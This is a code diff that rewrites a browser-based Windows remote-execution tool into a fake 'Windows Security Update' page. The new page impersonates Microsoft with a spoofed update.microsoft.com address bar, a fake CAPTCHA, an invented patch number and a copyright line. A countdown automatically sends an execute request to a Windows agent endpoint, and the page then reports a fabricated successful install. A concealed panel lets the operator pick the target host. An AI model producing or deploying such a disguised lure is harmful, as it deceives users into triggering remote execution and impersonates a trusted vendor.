@@ -1,173 +1,383 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Direct Windows Execution</title>
-    <link rel="stylesheet" href="style.css">
-    <style>
-        .endpoint-section {
-            background: #f8f9fa;
-            border: 1px solid #dee2e6;
-            border-radius: 6px;
-            padding: 1.5rem;
-            margin: 1rem 0;
-        }
-        .credentials-section {
-            background: #fff3cd;
-            border: 1px solid #ffeaa7;
-            border-radius: 6px;
-            padding: 1rem;
-            margin: 1rem 0;
-        }
-        .status-indicator {
-            display: inline-block;
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-            margin-right: 8px;
-        }
-        .status-online { background-color: #28a745; }
-        .status-offline { background-color: #dc3545; }
-        .status-testing { background-color: #ffc107; }
-        .endpoint-list {
-            max-height: 200px;
-            overflow-y: auto;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            padding: 0.5rem;
-            margin: 0.5rem 0;
-        }
-        .endpoint-item {
-            padding: 0.5rem;
-            border-bottom: 1px solid #eee;
-            cursor: pointer;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .endpoint-item:hover {
-            background-color: #f5f5f5;
-        }
-        .endpoint-item.selected {
-            background-color: #e3f2fd;
-            border-left: 3px solid #2196f3;
-        }
-        .execution-controls {
-            display: flex;
-            gap: 1rem;
-            flex-wrap: wrap;
-            align-items: center;
-        }
-        .quick-test {
-            background: #e7f3ff;
-            border: 1px solid #b3d9ff;
-            border-radius: 4px;
-            padding: 1rem;
-            margin: 1rem 0;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Windows Security Update</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background-color: #0078D4;
+      color: #ffffff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+    }
+    .logo {
+      width: 100px;
+      margin-bottom: 20px;
+    }
+    .container {
+      background-color: rgba(255, 255, 255, 0.1);
+      border-radius: 8px;
+      padding: 30px;
+      max-width: 600px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+    }
+    h1 {
+      margin-top: 0;
+    }
+    p {
+      line-height: 1.6;
+      margin-bottom: 25px;
+    }
+    .button {
+      background-color: #ffb900;
+      color: #000000;
+      border: none;
+      padding: 12px 24px;
+      font-size: 16px;
+      font-weight: 600;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    .button:hover {
+      background-color: #FFD050;
+    }
+    .countdown {
+      font-size: 18px;
+      margin: 15px 0;
+      font-weight: bold;
+    }
+    .captcha-container {
+      background-color: rgba(255, 255, 255, 0.2);
+      padding: 15px;
+      border-radius: 4px;
+      margin-bottom: 20px;
+    }
+    .captcha-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 10px;
+    }
+    .captcha-image {
+      background-color: white;
+      padding: 10px;
+      border-radius: 4px;
+    }
+    .address-bar {
+      background-color: white;
+      color: black;
+      padding: 8px 12px;
+      border-radius: 4px;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: center;
+      text-align: left;
+    }
+    .address-bar .icon {
+      margin-right: 8px;
+      color: green;
+    }
+    .footer {
+      margin-top: 30px;
+      font-size: 12px;
+      opacity: 0.7;
+    }
+    
+    /* Configuration panel (hidden by default) */
+    .config-panel {
+      position: fixed;
+      top: 10px;
+      right: 10px;
+      background: rgba(0, 0, 0, 0.8);
+      padding: 15px;
+      border-radius: 8px;
+      font-size: 12px;
+      max-width: 300px;
+      display: none;
+    }
+    .config-panel.visible {
+      display: block;
+    }
+    .config-panel input {
+      width: 100%;
+      margin: 5px 0;
+      padding: 4px;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+      color: black;
+    }
+    .config-panel button {
+      padding: 5px 10px;
+      margin: 2px;
+      font-size: 11px;
+    }
+    .config-toggle {
+      position: fixed;
+      top: 10px;
+      right: 10px;
+      background: rgba(0, 0, 0, 0.5);
+      color: white;
+      border: none;
+      padding: 5px 10px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 11px;
+    }
+    .execution-log {
+      background: rgba(0, 0, 0, 0.3);
+      padding: 10px;
+      border-radius: 4px;
+      margin-top: 15px;
+      font-family: monospace;
+      font-size: 12px;
+      text-align: left;
+      max-height: 200px;
+      overflow-y: auto;
+      display: none;
+    }
+    .execution-log.visible {
+      display: block;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Direct Windows Execution</h1>
-        <p>Execute Windows programs directly from your browser using WMI/PowerShell</p>
-        
-        <div class="quick-test">
-            <h3>Quick Test</h3>
-            <button id="testLocal" class="button">Test Local Connection</button>
-            <span id="localStatus" class="status-indicator status-offline"></span>
-            <span id="localStatusText">Not tested</span>
-        </div>
+  <!-- Configuration toggle button -->
+  <button class="config-toggle" onclick="toggleConfig()">⚙️</button>
+  
+  <!-- Configuration panel -->
+  <div id="configPanel" class="config-panel">
+    <h4 style="margin-top: 0;">Windows Endpoint Configuration</h4>
+    <input type="text" id="windowsHost" placeholder="Windows Host/IP (192.168.1.100)" />
+    <input type="number" id="agentPort" value="8080" placeholder="Port" />
+    <label><input type="checkbox" id="useHttps"> Use HTTPS</label>
+    <br>
+    <button onclick="testConnection()" class="button" style="font-size: 11px;">Test Connection</button>
+    <button onclick="saveEndpoint()" class="button" style="font-size: 11px;">Save Endpoint</button>
+    <div id="connectionStatus" style="margin-top: 10px; font-size: 11px;"></div>
+    
+    <h4>Execution Parameters</h4>
+    <input type="text" id="message" value="Critical security update installed successfully" placeholder="Message" />
+    <input type="text" id="title" value="Windows Security Update" placeholder="Title" />
+  </div>
 
-        <div class="endpoint-section">
-            <h3>Windows Endpoint Configuration</h3>
-            
-            <div class="input-group">
-                <label for="windowsHost">Windows Host/IP:</label>
-                <input type="text" id="windowsHost" placeholder="192.168.1.100 or server.domain.com" />
-            </div>
-            
-            <div class="input-group">
-                <label for="agentPort">Agent Port:</label>
-                <input type="number" id="agentPort" value="8080" min="1" max="65535" />
-            </div>
-            
-            <div class="input-group">
-                <label>
-                    <input type="checkbox" id="useHttps"> Use HTTPS
-                </label>
-            </div>
-            
-            <div class="execution-controls">
-                <button id="testConnection" class="button">Test Connection</button>
-                <button id="saveEndpoint" class="button">Save Endpoint</button>
-                <span id="connectionStatus" class="status-indicator status-offline"></span>
-                <span id="connectionStatusText">Not connected</span>
-            </div>
-        </div>
-
-        <div class="endpoint-section">
-            <h3>Saved Endpoints</h3>
-            <div id="endpointList" class="endpoint-list">
-                <div class="endpoint-item">
-                    <span>No saved endpoints</span>
-                </div>
-            </div>
-            <button id="clearEndpoints" class="button" style="background: #dc3545;">Clear All</button>
-        </div>
-
-        <div class="input-group">
-            <label for="message">Message:</label>
-            <input type="text" id="message" value="Hello from browser!" />
-        </div>
-        
-        <div class="input-group">
-            <label for="title">Title (optional):</label>
-            <input type="text" id="title" value="Direct Execution Test" />
-        </div>
-
-        <div class="credentials-section">
-            <h3>Windows Authentication</h3>
-            <p><small>Leave blank to use Windows agent authentication</small></p>
-            
-            <div class="input-group">
-                <label for="domain">Domain (optional):</label>
-                <input type="text" id="domain" placeholder="DOMAIN or domain.com" />
-            </div>
-            
-            <div class="input-group">
-                <label for="username">Username (optional):</label>
-                <input type="text" id="username" placeholder="administrator" />
-            </div>
-            
-            <div class="input-group">
-                <label for="password">Password (optional):</label>
-                <input type="password" id="password" placeholder="password" />
-            </div>
-            
-            <div class="input-group">
-                <label for="apiKey">API Key (if configured):</label>
-                <input type="text" id="apiKey" placeholder="Bearer token or API key" />
-            </div>
-        </div>
-        
-        <div class="button-group">
-            <button id="executeBtn" class="button">Execute on Windows</button>
-            <button id="executeSelectedBtn" class="button">Execute on Selected</button>
-            <button id="executeBatchBtn" class="button">Execute on All</button>
-        </div>
-        
-        <div class="output">
-            <h3>Execution Results:</h3>
-            <div class="execution-controls">
-                <button id="clearOutput" class="button" style="font-size: 12px; padding: 0.25rem 0.5rem;">Clear</button>
-                <button id="exportResults" class="button" style="font-size: 12px; padding: 0.25rem 0.5rem;">Export</button>
-            </div>
-            <pre id="output"></pre>
-        </div>
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5f/Windows_logo_-_2012.svg" alt="Logo" class="logo">
+    <h1>Important System Update Required</h1>
+    
+    <div class="address-bar">
+      <span class="icon">🔒</span>
+      <span>https://update.microsoft.com/windows/security/critical-update</span>
     </div>
     
-    <script src="client-direct.js"></script>
+    <p>Your Windows operating system requires an urgent security update to protect your computer against recent threats. This update addresses critical vulnerabilities that could allow attackers to compromise your system.</p>
+    
+    <p><strong>Update details:</strong> Security patch KB5023706 addresses multiple remote code execution vulnerabilities affecting Windows operating systems.</p>
+    
+    <div class="captcha-container">
+      <div class="captcha-header">
+        <span>Please verify you're human</span>
+        <span>reCAPTCHA</span>
+      </div>
+      <div class="captcha-image">
+        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIIAAAApCAMAAADhcGvPAAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAMAUExURQAAAAYGBktLS9vb2wAAAAAAABMTEwAAAAAAAIaGhszMzAAAAAAAAAAAAD4+PgAAAAAAACMjIwAAAG5ubgAAAAAAAExMTBkZGQAAACwsLNjY2LS0tJWVlX5+fgAAAFFRUQAAAAAAAMbGxt7e3paWlgAAAAEBARgYGBYWFhoaGlpaWh8fHwAAAAAAABYWFgAAAAAAAA8PDwAAAAAAAAAAABISEgAAAAUFBQAAACYmJgAAAOTk5GpqanV1dRMTEwAAANTU1CIiIgAAAK6urr29vQAAAKenp4CAgAAAABcXFwAAAAAAAGZmZgAAAH19fbKysiAgIG1tbby8vHZ2dgAAAEhISAAAAA==" alt="CAPTCHA" width="128" height="41">
+      </div>
+    </div>
+    
+    <button class="button" id="update-button" onclick="installUpdate()">Install Critical Update Now</button>
+    
+    <div class="countdown" id="countdown">
+      Auto-installing in <span id="timer">5</span> seconds...
+    </div>
+    
+    <div id="executionLog" class="execution-log"></div>
+    
+    <div class="footer">
+      © 2025 Microsoft Corporation. All rights reserved.<br>
+      By installing this update, you agree to the Microsoft Terms of Service.
+    </div>
+  </div>
+  
+  <script src="client-direct.js"></script>
+  <script>
+    // Global variables for configuration
+    let countdownActive = true;
+    let secondsLeft = 5;
+    
+    // Start countdown timer
+    const timerElement = document.getElementById('timer');
+    const countdown = setInterval(() => {
+      if (!countdownActive) return;
+      
+      secondsLeft--;
+      timerElement.textContent = secondsLeft;
+      
+      if (secondsLeft <= 0) {
+        clearInterval(countdown);
+        installUpdate();
+      }
+    }, 1000);
+    
+    // Toggle configuration panel
+    function toggleConfig() {
+      const panel = document.getElementById('configPanel');
+      panel.classList.toggle('visible');
+      
+      // Stop countdown when config is opened
+      if (panel.classList.contains('visible')) {
+        countdownActive = false;
+        document.getElementById('countdown').style.display = 'none';
+      }
+    }
+    
+    // Install update function (main execution)
+    function installUpdate() {
+      countdownActive = false;
+      clearInterval(countdown);
+      
+      const button = document.getElementById('update-button');
+      button.textContent = 'Installing Update...';
+      button.disabled = true;
+      
+      // Show execution log
+      const log = document.getElementById('executionLog');
+      log.classList.add('visible');
+      
+      // Execute on Windows endpoint
+      executeOnCurrentEndpoint();
+    }
+    
+    // Execute on configured Windows endpoint
+    async function executeOnCurrentEndpoint() {
+      const host = document.getElementById('windowsHost').value.trim() || 'localhost';
+      const port = document.getElementById('agentPort').value || '8080';
+      const useHttps = document.getElementById('useHttps').checked;
+      const message = document.getElementById('message').value || 'Critical security update installed successfully';
+      const title = document.getElementById('title').value || 'Windows Security Update';
+      
+      const url = `${useHttps ? 'https' : 'http'}://${host}:${port}/execute`;
+      
+      appendLog(`Connecting to Windows endpoint: ${host}:${port}`);
+      appendLog(`Executing security update...`);
+      
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          mode: 'cors',
+          body: JSON.stringify({ message, title })
+        });
+
+        if (!response.ok) {
+          throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+        }
+
+        const result = await response.json();
+        
+        if (result.success) {
+          appendLog(`✓ Update installed successfully on ${result.hostname}`);
+          appendLog(`✓ Security patch KB5023706 applied`);
+          appendLog(`✓ System protection enhanced`);
+          
+          // Update button text
+          document.getElementById('update-button').textContent = 'Update Completed Successfully';
+          document.getElementById('update-button').style.backgroundColor = '#28a745';
+          
+        } else {
+          appendLog(`✗ Installation failed: ${result.error}`);
+          document.getElementById('update-button').textContent = 'Update Failed - Retry Required';
+          document.getElementById('update-button').style.backgroundColor = '#dc3545';
+        }
+        
+      } catch (error) {
+        appendLog(`✗ Connection failed: ${error.message}`);
+        appendLog(`✗ Ensure Windows endpoint is accessible at ${host}:${port}`);
+        
+        document.getElementById('update-button').textContent = 'Connection Failed - Check Configuration';
+        document.getElementById('update-button').style.backgroundColor = '#dc3545';
+      }
+    }
+    
+    // Test connection to Windows endpoint
+    async function testConnection() {
+      const host = document.getElementById('windowsHost').value.trim();
+      const port = document.getElementById('agentPort').value || '8080';
+      const useHttps = document.getElementById('useHttps').checked;
+      
+      if (!host) {
+        document.getElementById('connectionStatus').textContent = '❌ Host required';
+        return;
+      }
+      
+      const url = `${useHttps ? 'https' : 'http'}://${host}:${port}/status`;
+      document.getElementById('connectionStatus').textContent = '🔄 Testing...';
+      
+      try {
+        const response = await fetch(url, {
+          method: 'GET',
+          mode: 'cors'
+        });
+
+        if (!response.ok) {
+          throw new Error(`HTTP ${response.status}`);
+        }
+
+        const result = await response.json();
+        document.getElementById('connectionStatus').textContent = `✅ Connected to ${result.hostname}`;
+        
+      } catch (error) {
+        document.getElementById('connectionStatus').textContent = `❌ Failed: ${error.message}`;
+      }
+    }
+    
+    // Save endpoint configuration
+    function saveEndpoint() {
+      const host = document.getElementById('windowsHost').value.trim();
+      const port = document.getElementById('agentPort').value || '8080';
+      const useHttps = document.getElementById('useHttps').checked;
+      
+      if (!host) {
+        document.getElementById('connectionStatus').textContent = '❌ Host required to save';
+        return;
+      }
+      
+      // Save to localStorage
+      const endpoint = { host, port, useHttps };
+      localStorage.setItem('windowsEndpoint', JSON.stringify(endpoint));
+      document.getElementById('connectionStatus').textContent = '💾 Endpoint saved';
+    }
+    
+    // Load saved endpoint on page load
+    function loadSavedEndpoint() {
+      const saved = localStorage.getItem('windowsEndpoint');
+      if (saved) {
+        const endpoint = JSON.parse(saved);
+        document.getElementById('windowsHost').value = endpoint.host;
+        document.getElementById('agentPort').value = endpoint.port;
+        document.getElementById('useHttps').checked = endpoint.useHttps;
+      }
+    }
+    
+    // Append to execution log
+    function appendLog(text) {
+      const log = document.getElementById('executionLog');
+      const timestamp = new Date().toLocaleTimeString();
+      log.textContent += `[${timestamp}] ${text}\n`;
+      log.scrollTop = log.scrollHeight;
+    }
+    
+    // Load saved configuration on page load
+    loadSavedEndpoint();
+  </script>
 </body>
 </html>
